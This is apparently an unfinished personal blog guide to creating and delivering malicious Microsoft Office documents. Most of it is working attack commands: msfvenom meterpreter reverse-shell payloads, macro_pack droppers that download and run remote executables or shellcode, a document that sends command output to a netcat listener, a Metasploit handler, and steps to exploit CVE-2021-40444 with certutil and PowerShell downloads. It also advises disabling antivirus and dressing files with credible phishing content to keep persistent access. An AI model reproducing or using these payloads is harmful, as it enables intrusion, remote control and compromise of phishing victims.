---
layout: post
title: "Create and deliver a Microsoft office malicious file"
categories: Guides
tags: 
---

In this post the idea is develop a guide to:
1. Generate a malicious binary with msfvenom to get a reverse shell on each kind of device
2. Apply techniques to skip the AV protections or alerts

## AV evasion
https://pentestlab.blog/2017/05/23/applocker-bypass-rundll32/

#### msfvenom
With metasploit we can get malicious code to 
	a) Skip AV protection
	b) to execute from macros for examples

----------------------------------
We're goin to use msfvenom.bat to get easier method to test our payloads, for that download and install metasploit in your windows:
https://www.metasploit.com/download and after install it you can execute `C:\metasploit-framework\bin\msfvenom.bat`


And remember that maybe is better disable the protection that windows have folling the next manual https://ik4.es/desactivar-la-proteccion-contra-virus-y-amenazas-de-windows-10-en-el-control-de-defender/

----------------------------------

https://blog.didierstevens.com/2017/08/16/generating-powershell-scripts-with-msfvenom-on-windows/

---------------------------------------
Let's to create two malicious files, one for each kind of architecture
```
#msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.123 LPORT=4444 -f vba -o /tmp/exe.vba

#or create one process per kind of procesor and later append both to the word
msfvenom -p windows/meterpreter/reverse_tcp LPORT=4444 LHOST=10.10.10.123 -f raw -o x86.bin
msfvenom -p windows/x64/meterpreter/reverse_tcp LPORT=5555 LHOST=10.10.10.123 -f raw -o x64.bin
```

or from 25 técnicas for redTeam
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.54.132 LPORT=4444 -f vba -o /tmp/exe.vba
```
---------------------------------------

The first step is create a executable that we can execute in out Windows machine.
With the next command we're  cre
```
C:\metasploit-framework\bin\msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.54.132 LPORT=443 -e x64/shikata_ga_nai -i 5 -f vba | C:\Users\deby\Downloads\macro_pack\macro_pack.exe -o -G meterobf.docx
```




## MacroPack
------------------------------------------
Macropack is a tool that allow introduce
#### Install
######Linux
https://github.com/sevagas/macro_pack
Macropack if a tool that allow us to insert in a document a malicious executable. To execute macropack and get an outputfile we need execute it on windows with word package installed
We install the dependencies using root privileges.
```
git clone https://github.com/sevagas/macro_pack
cd macro_pack

python3 -m pip install --upgrade pip
sudo python3 -m pip install -r requirements.txt
python3 -m pip install wsgidav
cd src

python3 ./macro_pack.py -h
```

**Alert! In Linux we can't generate documents because it needs of office installed!**

###### Windows
It's neccesary use Windows for nest a corrupt file in a office file. We could use python here but knowing that Microsoft is the worst for that kind of things (Work in general) just download the exe file compiled form github
https://github.com/sevagas/macro_pack/releases/tag/v2.1.0

For save the file in the system you need first disable the security in windows because it alerts you as a mimikatz executable. We are using a precompiled file, it's recomended just use a VM to use this kind of tools trust but not full trust.

------------------------------------------
##### Download a File
After the neccesary installation we can generate a file that download a file from a http server
`echo "http://172.16.54.1:8000/virus.exe" "C:\Users\deby\dropped.exe" |  macro_pack.exe -o -t DROPPER -G "drop4.xlsm"`
To execute the download you need enable the macros.


##### Execute a command and return the output to nc
```
echo "http://172.16.54.132:8888" "dir /Q C:" | macro_pack.exe -t REMOTE_CMD -o -G cmd.doc`

# Catch result with any webserver or netcat
nc -l -p 8888
	>06/09/2021  18:22    <DIR>          DESKTOP-02RG4FT\deby   .
	06/09/2021  18:22    <DIR>          BUILTIN\Administradores..
	06/09/2021  18:22            35.328 DESKTOP-02RG4FT\deby   cmd.doc
	06/09/2021  17:48            16.940 DESKTOP-02RG4FT\deby   drop3.xlsm
	06/09/2021  17:52            16.959 DESKTOP-02RG4FT\deby   drop4.xlsm
	04/09/2021  20:39           333.064 DESKTOP-02RG4FT\deby   Firefox Installer.exe
	04/09/2021  21:22        50.101.024 DESKTOP-02RG4FT\deby   Git-2.33.0.2-64-bit.exe
	06/09/2021  16:35    <DIR>          DESKTOP-02RG4FT\deby   macro_pack
	06/09/2021  17:09        10.289.676 DESKTOP-02RG4FT\deby   macro_pack.exe
	06/09/2021  18:09            31.413 DESKTOP-02RG4FT\deby   meter.vbs
	06/09/2021  18:09               283 DESKTOP-02RG4FT\deby   meterpreter.rc
	06/09/2021  17:57            45.272 DESKTOP-02RG4FT\deby   nc64.exe
	04/09/2021  20:49         7.424.160 DESKTOP-02RG4FT\deby   OfficeSetup.exe
	06/09/2021  16:59        28.895.456 DESKTOP-02RG4FT\deby   python-3.9.7-amd64.exe
```
It needs macros enabled. Could we get a revershell?
.
.
.
.
.
.
.


there is two beautiful ways for plannify the attack, first:
Let's embedding both executables in a _word file_ and when the code will be execute the correct one will be the one to be execute due to the processor detector.
```
echo “x86.bin” “x64.bin” | macro_pack.exe -t AUTOSHELLCODE -o –autopack -G sc_auto.doc
```
Or the othe way it make me fall in love was th "DROPPER_SHELLCODE"
```
echo "http://192.168.5.10:8080/x32calc.bin" "http://192.168.5.10:8080/x64calc.bin" | macro_pack.exe -t DROPPER_SHELLCODE -o --shellcodemethod=ClassicIndirect -G samples\sc_dl.xls
```
We define two url (One per each kind of processor) and the payload download the bin and execute without saving in the disk. Really beautiful.

I just use:
```
python3 macro_pack.py -f /tmp/exe.vba -o -G myDoc.docm
```

We have to fix a pair of things at this point:
1. We should delete the metadata 
**How should we do this?**

2. We should fill with a credible content (In the same sense that que phising campain if we had it) to have more time to create a persistent conection with the compromised computer

-----------------

##### Getting a meterpreter
To get a conection with this malicious file we just need to put a meterpreter session listening at the port necessary
```
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp 
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.1.138
LHOST => 192.168.1.138
msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf6 exploit(multi/handler) > exploit

[-] Handler failed to bind to 192.168.1.138:4444:-  -
[*] Started reverse TCP handler on 0.0.0.0:4444 
```

**Me queda probarlo con una máquina virtual**

##### Getting a reverse shell with nc
```

```

**Me queda probarlo con una máquina virtual**



-----------










----------------------------------------------
## CVE's
### CVE-2021-40444
https://github.com/lockedbyte/CVE-2021-40444
In your kali Linux:
```text
#generate the document using calc.dll as pyload to execute
python3 exploit.py generate test/calc.dll http://kaliLinux_IP

#Expose the document through http and make the windows download it
cd out
python3 -m http.server 8000


# Now start the http server that will fake Microsoft office
sudo python3 exploit.py host 80
```

In your Windows VM:
```text
#Download the malicious document using the method you prefer
1) certutil -> `certutil.exe -f -urlcache -split http://KaliIP:8000/document.docx document.docx`
2) powershell
	-> powershell -c "(new-object System.Net.WebClient).DownloadFile('http://KaliIP:8000/document.docx','C:\Users\user\Desktop\document.docx')"

->powershell Invoke-WebRequest "http://KaliIP:8000/document.docx" -OutFile "C:\Users\user\Desktop\file.exe"


```

After that just open the document and enable the edition and...

Windows defender detect and stop the malicious document alerting about CVE-2021-40444. Even disabling it  the execution is still stopped
- You have to disable windows defender and real-time protection

Why is being detected this file, is for the payload or because the attack vector?
